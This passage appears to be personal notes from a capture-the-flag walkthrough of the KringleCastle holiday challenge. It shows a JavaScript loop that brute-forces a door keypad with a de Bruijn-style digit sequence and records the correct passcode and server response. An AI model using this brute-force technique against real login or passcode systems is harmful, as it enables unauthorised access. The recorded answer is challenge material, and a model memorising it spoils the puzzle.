let chars = "0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 0 0 0".split(' ')
```
5. Loop through the array, pressing each of the buttons:
```javascript
chars.forEach((thisChar) => { addShape(thisChar) })
```
6. Running the code will make XHR requests for each attempt; all of them returning `{"success":false,"message":"Incorrect guess."}`; except:
`https://doorpasscode.kringlecastle.com/checkpass.php?i=0120&resourceId=d3f52771-16c0-40c1-91f2-383d1667b4d5` which will return:

`{"success":true,"resourceId":"d3f52771-16c0-40c1-91f2-383d1667b4d5","hash":"01ea8727dec2cf58a9f7557a40cecc971d670f47d40d3940e901e97b0f885b26","message":"Correct guess!"}`









# To Do List


# Identified services:
https://packalyzer.kringlecastle.com/ > See source code of the page, look around for comments
